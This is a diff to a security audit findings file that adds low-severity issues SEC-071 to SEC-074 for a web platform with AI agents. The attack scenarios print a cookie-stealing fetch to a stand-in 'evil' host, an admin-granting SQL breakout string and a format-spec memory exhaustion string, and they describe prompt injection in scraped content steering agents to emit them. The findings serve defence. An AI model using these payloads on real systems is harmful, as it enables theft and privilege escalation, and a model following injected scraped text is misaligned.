@@ -2,7 +2,7 @@
 
 _Hardening / defense-in-depth. Address opportunistically._
 
-**38** finding(s). See [`../FINDINGS.md`](../FINDINGS.md) for live status. Reviewed 2026-06-20.
+**42** finding(s) (SEC-071–074 added 2026-10-08). See [`../FINDINGS.md`](../FINDINGS.md) for live status. Reviewed 2026-10-08.
 
 ---
 
@@ -433,13 +433,20 @@ Add probe retry/backoff before declaring failure to avoid reverting on transient
 | | |
 |---|---|
 | **Severity** | low |
-| **Status** | open |
+| **Status** | ✅ fixed (2026-10-08 reconciliation) |
 | **Category** | Supply chain / hardening |
 | **Dimension** | ci-workflows |
-| **Location** | `.github/workflows/solver-agent.yml:29,31; .github/workflows/scraper-ci.yml:20-22` |
+| **Location** | `.github/workflows/solver-agent.yml:29,31; .github/workflows/scraper-ci.yml:20-22` (both workflows removed) |
 | **Reviewer confidence** | high |
 | **Verifier verdict** | confirmed (adjusted: low) |
 | **First seen** | 2026-06-07 |
+
+> **Reconciliation 2026-10-08 → fixed.** Both cited workflows no longer exist (`solver-agent.yml` and
+> `scraper-ci.yml` were deleted with the Solver/scraper teardown). The only remaining workflows —
+> `promote.yml`, `codeql.yml`, `prune-vercel-previews.yml` — SHA-pin every third-party action
+> (`promote.yml:25` `actions/checkout@11bd719…`, `:46` `actions/setup-node@49933ea…`, `:59`
+> `actions/setup-python@a26af69…`; `codeql.yml` likewise). No mutable-tag action remains on `main`.
+> (The separate gitleaks-binary-fetch integrity gap is tracked as **SEC-065**, still open.)
 
 **Description**
 
@@ -1455,10 +1462,21 @@ Validate accent_color/primary_color/widget_color against a strict hex/CSS-color 
 | **Status** | open |
 | **Category** | Injection (str.format / template) |
 | **Dimension** | injection |
-| **Location** | `backend/auth_service/services/booking_i18n.py:86-95` |
+| **Location** | `backend/auth_service/services/booking_i18n.py:95-101` (was :86-95; `raw.format(**fmt)` at :101) |
 | **Reviewer confidence** | high |
-| **Verifier verdict** | confirmed |
+| **Verifier verdict** | confirmed (still present on main 2026-10-08) |
 | **First seen** | 2026-06-20 |
+
+> **Reconciliation 2026-10-08 — still open, new memory-DoS angle.** Still present on `main`
+> (`booking_i18n.py:101` `raw.format(**fmt)` on the tenant override; `html.escape` at :98 does not
+> neutralise `{}`/format-spec syntax). The ID-colliding dev PR #62 ("SEC-060") fixed a *different*
+> issue (accent in reschedule/cancel email `_button`), not this one. **Added this review:** beyond the
+> type-internal info-disclosure already described, a format *spec* abuse such as `"{name:>9999999999}"`
+> is syntactically valid and forces Python to build a multi-gigabyte padded string, raising
+> `MemoryError`/`OverflowError` — which is **not** in the caught tuple `(KeyError, IndexError,
+> ValueError)`, so the exception escapes `tt` and aborts the email send. Broaden the except and/or stop
+> treating tenant copy as a format template (explicit `.replace()` of the known keys, or reject any
+> `:`/`!`/`.`/`[` spec).
 
 **Description**
 
@@ -1733,5 +1751,171 @@ Verifier confirmed pg_rate_limit.over_limit returns False on any DB exception (f
 **Recommendation**
 
 Keep fail-open for availability but add a durable, instance-independent secondary brake on the failure path (e.g. enforce a low fixed slowapi cap PLUS exponential argon2-cost backoff, or fail-closed specifically for the lockout check after N consecutive RPC errors). At minimum, alert on sustained rate_limit_over exceptions so a DB-down brute-force window is detected.
+
+---
+
+<a id="sec-071"></a>
+
+## SEC-071 — Promote secret-scan allowlist excludes entire `tests/`, `tests_integration/` and `docs/` trees, so a real secret committed there bypasses the only pre-prod scan
+
+| | |
+|---|---|
+| **Severity** | low |
+| **Status** | open |
+| **Category** | Secret scanning / CI gate coverage |
+| **Dimension** | ci-workflows / secrets-config |
+| **Location** | `.gitleaks.toml:85-87 ([allowlist] paths)` |
+| **Reviewer confidence** | high |
+| **Verifier verdict** | confirmed (low) |
+| **First seen** | 2026-10-08 |
+
+**Description**
+
+`.gitleaks.toml` drives **both** secret scans in the pipeline: the pre-commit hook (`gitleaks protect --staged`) and the promote-gate full-tree scan (`gitleaks detect --no-git`), which per CLAUDE.md is *the only secret scan before code reaches prod*. The `[allowlist] paths` array suppresses findings for any `tests/`/`test/` directory anywhere in the tree, all `tests_integration/` dirs, and all `docs/` dirs — **path-based, matched regardless of content** (separate from the narrow content `regexes` sentinels at lines 63-73 that already whitelist fixture/example tokens). A real `sb_secret_*` service-role key, `cmsk_prod_*` admin key, or `re_*` Resend key accidentally committed into any test fixture, integration test, or docs page is flagged by neither scan and lands on `main` + in history. Given the platform's #1 safety constraint (one prod DB, service-role bypasses RLS, gitleaks is the only pre-push scan), and that `tests_integration/` legitimately touches real services, disabling detection for three large trees is a meaningful blind spot rather than pure defense-in-depth.
+
+**Attack scenario**
+
+A developer debugging against the shared prod Supabase DB pastes a live `sb_secret_*` key into a `tests_integration/` helper or a `docs/` runbook example and commits. Neither the pre-commit hook nor the promote gate flags it (path allowlisted); the key persists on `main` and in git history (history is never re-scanned).
+
+**Evidence**
+
+```toml
+  '''(^|/)tests?/''',
+  '''(^|/)tests_integration/''',
+  '''(^|/)docs/''',
+```
+
+**Adversarial verification**
+
+Re-read `.gitleaks.toml:85-87`: the `[allowlist] paths` entries are path-based and suppress all scanning of matching files irrespective of content. Both scan paths load this config (`.pre-commit-config.yaml` → `gitleaks protect --staged`; `.github/workflows/promote.yml:40-43` → `gitleaks detect --source . --no-git --config .gitleaks.toml`). The content-matching `regexes` sentinels already whitelist legitimate fake/example credentials, so the directory-wide `paths` exclusions are broader than the stated "fixtures hold fake creds" rationale requires. Not attacker-triggered (needs a developer mistake), bounded to leakage into those trees → **low**, but the net is genuinely disabled for three large trees including the integration tests that touch real services. Not in `dismissed.md`.
+
+**Recommendation**
+
+Narrow the allowlist from whole-directory path excludes to content-based exceptions (the sentinel regexes already cover deterministic fixtures) or to the specific known fixture files (as already done for `test_admin_keys*.py`), so genuine high-entropy secrets in `tests/` and `docs/` are still caught.
+
+---
+
+<a id="sec-072"></a>
+
+## SEC-072 — Design Prompt creator Phase 6 writeback uses bare `$$` dollar-quoting for model/lead-derived XML → Postgres literal breakout
+
+| | |
+|---|---|
+| **Severity** | low |
+| **Status** | open |
+| **Category** | SQL literal breakout / weak escaping |
+| **Dimension** | agents |
+| **Location** | `agents/Design Prompt creator/phases/6-writeback.md:15-18 (escape rules), 35-41 (UPDATE template)` |
+| **Reviewer confidence** | medium |
+| **Verifier verdict** | partially_confirmed (low) |
+| **First seen** | 2026-10-08 |
+
+**Description**
+
+Phase 6 instructs the agent to persist generated design-prompt XML into the production `leads` table via an MCP `execute_sql` `UPDATE leads SET design_prompt = $$<wrapped XML>$$ WHERE id = '<lead_id>'`, using empty-tag `$$…$$` dollar-quoting. The escape rules (lines 15-18) escape only `&`, `<`, `>` — **not `$`**. The XML body is model output derived from untrusted scraped lead fields + web research. Any `$$` in the body terminates the dollar-quoted literal early, and the trailing text is parsed as SQL against the single shared production database. Empty-tag dollar-quoting is defeated by any `$$` in attacker-influenced content, so it is a weak escaping choice.
+
+**Attack scenario**
+
+Most realistic: a benign `$$` (the standard price-tier notation — `$`, `$$`, `$$$` — for the cafe/restaurant/retail categories this agent targets) appears in a generated brief, breaking the literal → syntax error → fallback save to `runs/<lead>.xml` (data-corruption/reliability bug). Worst case (heavily gated): prompt-injection in scraped business content steers the model to emit `$$; UPDATE users SET is_admin=true WHERE email='attacker@x'; $$`; the MCP `execute_sql` write (which `guard.mjs` routes to **ask**, not deny) would run both statements if a human approves the visibly-malicious SQL.
+
+**Evidence**
+
+```sql
+   UPDATE leads
+   SET design_prompt = $$<wrapped XML>$$
+   WHERE id = '<lead_id>';
+   (Use `$$…$$` dollar-quoting so the wrapped content's quotes/apostrophes don't need escaping.)
+```
+
+**Adversarial verification**
+
+The escaping **defect is real and confirmed**: lines 15-18 cover only `&`/`<`/`>`; the template uses empty-tag `$$`; the body is model output built from untrusted-influenced data. **Partially** confirmed because the privilege-escalation headline is overstated: this is an instruction file (the agent composes the SQL by following markdown, not an attacker-controlled parameterized sink), the agent is local-only + human-invoked (AGENTS.md:17), and `guard.mjs` surfaces the write for human approval (imperfect — a long XML body can bury injected SQL, but a human still sees it). The high-probability outcome is benign corruption from the `$$` price-tier notation, not a breach. Low severity stands. Not in `dismissed.md`; not already fixed (bare `$$` present on main).
+
+**Recommendation**
+
+Do not hand-build the SQL string. Pass the value as a bound parameter; or if MCP requires inline SQL, generate a random dollar-quote tag per write (e.g. `$dp<nonce>$ … $dp<nonce>$`) and verify the tag does not occur in the body before substituting (abort if it does).
+
+---
+
+<a id="sec-073"></a>
+
+## SEC-073 — CMS Connector interpolates model-controlled booking `public_slug` unescaped into generated `lib/booking.ts` (JS injection into the client site)
+
+| | |
+|---|---|
+| **Severity** | low |
+| **Status** | open |
+| **Category** | Code injection / untrusted-input → generated code |
+| **Dimension** | agents |
+| **Location** | `agents/CMS Connector - Website/scan.py:369 (public_slug), 462-472 (_write_booking_ts)` |
+| **Reviewer confidence** | high |
+| **Verifier verdict** | confirmed (low) |
+| **First seen** | 2026-10-08 |
+
+**Description**
+
+`_write_booking_ts` interpolates `slug` straight into a generated TypeScript source file via f-string with no escaping, both in the header comment and `const SLUG = "{slug}";`. `slug` is `public_slug = booking.get("public_slug") or project_slug` (scan.py:369) — and `public_slug` is a **model-emitted** field parsed from a JSON manifest the scan model produces from untrusted client-website source (the same untrusted-input flow SEC-016 flags). There is no slugify/validation/escaping of the model's `public_slug` (`_slugify` is applied only to the default project slug from the directory name). An injected slug value breaks out of the string literal and injects arbitrary JavaScript into the generated client code, which is committed to the client repo and executed in end-users' browsers. This is a **distinct sink** from SEC-016's prompt-analysis (SEC-016's verification treated `_write_booking_ts` as benign because no URL comes from the model — it did not consider string-literal breakout).
+
+**Attack scenario**
+
+A client page being onboarded (or third-party UGC on it) steers the scan model to emit `booking.public_slug = x"; fetch("https://evil/"+document.cookie); const _="`. The generated `lib/booking.ts` becomes `const SLUG = "x"; fetch("https://evil/"+document.cookie); const _="";`, shipping attacker JS into the deployed client website. Gated by the Phase-2 human review of the manifest and by `--provision`/`--github-repo` opt-in (hence **low**), but the UGC variant is a cross-trust escalation that poisons all visitors of the newly CMS-backed site.
+
+**Evidence**
+
+```python
+    content = f"""// Auto-generated by the CMS Connector. Headless booking client for "{slug}".
+const BASE = process.env.{env_prefix}BOOKING_API_BASE!;
+const SLUG = "{slug}";
+```
+
+**Adversarial verification**
+
+Confirmed by re-reading `scan.py`: f-string with unescaped `{slug}` at 470-472; `public_slug` is model-emitted (245-302 parse the manifest from untrusted source files) and passed unvalidated at 462. `_slugify` is applied only to the directory-name default (1039), never to `public_slug`. Grep for slug validation/escaping found none. Distinct string-literal-breakout sink, not a duplicate of SEC-016. Not in `dismissed.md`; present on main. Low given the human-review + opt-in gates.
+
+**Recommendation**
+
+`json.dumps(slug)` before interpolation, or validate `public_slug` against a strict `^[a-z0-9-]+$` allowlist before it reaches `_write_booking_ts` — the same hardening SEC-016 recommends for model-emitted side-effect values.
+
+---
+
+<a id="sec-074"></a>
+
+## SEC-074 — Per-account login lockout (SEC-011/020 fix) enables a targeted, persistent account-lockout DoS
+
+| | |
+|---|---|
+| **Severity** | low |
+| **Status** | open (accepted-risk candidate) |
+| **Category** | Rate limiting / availability |
+| **Dimension** | authn-session / ratelimit-dos |
+| **Location** | `backend/auth_service/routers/auth.py:37-38 (limits), 79-100 (lockout + reset-on-success)` |
+| **Reviewer confidence** | high |
+| **Verifier verdict** | confirmed (low) |
+| **First seen** | 2026-10-08 |
+
+**Description**
+
+The failed-login lockout bucket added for SEC-011/SEC-020 is keyed purely on the submitted email (`login_fail:{email}`), shared across instances via Postgres, and trips after `_LOGIN_FAIL_LIMIT=10` failures per 900s. Because the counter is **not** scoped to the attacker's IP/identity, any unauthenticated party who knows a client's email can lock that client out of their dashboard: 10 `POST /auth/login` with the victim's email + garbage passwords → the real owner gets HTTP 429 for 15 minutes. The per-IP `@limiter.limit("30/minute")` comfortably permits the 10 requests, and the lockout clears only on a **successful** login (`pg_rate_limit.reset`), which the victim cannot perform while locked — so repeating the burst every 15 minutes keeps the account locked indefinitely. This is the recognized downside of account-based brute-force protection (the inverse tradeoff of SEC-011/020), recorded so the tradeoff is explicit.
+
+**Attack scenario**
+
+Attacker learns a client's login email (client emails are not secret) and scripts a 10-request burst every 15 minutes against `/auth/login`, holding the victim out of their CMS dashboard persistently with no credentials and negligible cost.
+
+**Evidence**
+
+```python
+    fail_bucket = f"login_fail:{body.email.strip().lower()}"
+    if pg_rate_limit.over_limit(fail_bucket, _LOGIN_FAIL_LIMIT, _LOGIN_FAIL_WINDOW_SECONDS):
+        raise HTTPException(status_code=status.HTTP_429_TOO_MANY_REQUESTS,
+            detail="Too many failed login attempts. Please wait a few minutes and try again.")
+```
+
+**Adversarial verification**
+
+Confirmed by re-reading `auth.py`: bucket keyed on email only; threshold 10/900s; cleared only by a successful login (which the victim can no longer perform); per-IP 30/min allows the burst. Genuine low-effort persistent availability attack against any known client. Low (availability-only, no confidentiality/integrity impact) and partly an inherent tradeoff of the SEC-011/020 control — hence **accepted-risk candidate**: a human should decide whether to soften it.
+
+**Recommendation**
+
+Keep the per-account counter for brute-force defense but soften the availability impact: combine it with a per-IP failure dimension so one abusive source cannot lock a victim; verify the supplied password **before** refusing, so a correct password succeeds-and-resets even while "locked" (only genuinely-failing attempts count); and/or use exponential backoff/CAPTCHA instead of a hard 429. If the current behavior is accepted, record the decision here.
 
 ---
